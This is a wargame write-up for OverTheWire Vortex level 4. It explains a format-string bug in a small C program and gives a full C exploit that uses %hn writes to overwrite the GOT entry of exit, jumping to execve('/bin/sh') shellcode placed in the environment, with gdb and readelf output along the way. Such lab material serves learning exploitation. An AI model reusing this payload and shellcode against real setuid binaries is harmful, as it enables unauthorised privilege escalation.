# Overthewire Vortex Level 4 Writeup

This one is a "non-standard" format string overflow. I say non-standard since the start address of the first argument of `printf` of the "standard" one is usually fixed. If your input length is not a constant, you will find debugging of this program is completely disater.

```c
// -- andrewg, original author was zen-parse :)
#include <stdlib.h>


int main(int argc, char **argv)
{
        if(argc) exit(0);
        printf(argv[3]);
        exit(EXIT_FAILURE);
}
```

The `argv` array must end with `NULL`. So `argv[0]` is `NULL`, `argv[3]` is `env[2]`. After messing with the length, `%n` finally hits the right offset.

```
#0  0xf7e69873 in ?? ()
(gdb) i r
eax            0x41414141 1094795585
ecx            0x4  4
edx            0xffffffff -1
ebx            0xf7fca000 -134438912
esp            0xffffa210 0xffffa210
ebp            0xffffdc88 0xffffdc88
esi            0xf7fcaac0 -134436160
edi            0xffffdc70 -9104
eip            0xf7e69873 0xf7e69873
eflags         0x10246  [ PF ZF IF RF ]
cs             0x23 35
ss             0x2b 43
ds             0x2b 43
es             0x2b 43
fs             0x0  0
gs             0x63 99
```

You see `eax` is `0x41414141` and `ecx` is 4. 4 is the length of `AAAA`. `0xf7e69873` is totally nonsense. When there is an overflow, `printf`jumps to this address to make debugging harder. But this weird behavior could not stop me. It is worthnoting that, you should use the original program to debug, not the copied one. Otherwise the stack layout in `gdb` is slightly different(Though I have control of `argv` and `env`).

If `printf` sucessfully overwrites GOT entry of `exit`, we can jump to the shellcode at `env[0]`. Extract the address of `env[0]` in `gdb`:

```
(gdb) x/s *((char **)environ)
0xffffde15: "1\300Ph//shh/bin\211\343PS\211\341\211\302\260\v\315\200"
```

```
$ readelf -r /vortex/vortex4

Relocation section '.rel.dyn' at offset 0x2ac contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b4 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf
0804a010  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a014  00000307 R_386_JUMP_SLOT   00000000   exit
0804a018  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main
```

I need to overwrite the content on address `0804a014` with 0xffffde15. The final exploit is below. You need to adjust the `439` by yourself in order to trigger an overflow which writes to `AAAA`.

```c
#include <unistd.h>
#include <string.h>
#include <stdio.h>

int main() {
  int i;
  char buf[2048];
  int used = 0;
  // strncpy(buf, "AAAA", strlen("AAAA"));
  // used += 4;
  char payload[] = "\x14\xa0\x04\x08\x16\xa0\x04\x08%56845c%104$hn%8682c%105$hn";
  strncpy(buf, payload, strlen(payload));
  used += strlen(payload);

  for (i = 0; i < 104; i++)
  {
    strncpy(buf + used, "%p ", strlen("%p "));
    used += 3;
  }
  printf("debug, used: %d\n", used);

  // strncpy(buf + used, "%104$n", strlen("%104$n"));
  // used += strlen("%104$n");


  printf("Padding...\n");
  int times = 439 - used;
  for (i = 0; i < times; i++)
  {
    strncpy(buf + used, "B", strlen("B"));
    used += 1;
  }

  buf[used] = NULL;
  printf("buf: %s\n", buf);
  printf("len of buf: %d\n", strlen(buf));


  char *argv[] = {NULL};
  char *env[4];
  env[0] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";
  env[1] = "";


  env[2] = buf;
  env[3] = NULL;
  execve("/vortex/vortex4", argv, env);
  return 0;
}
```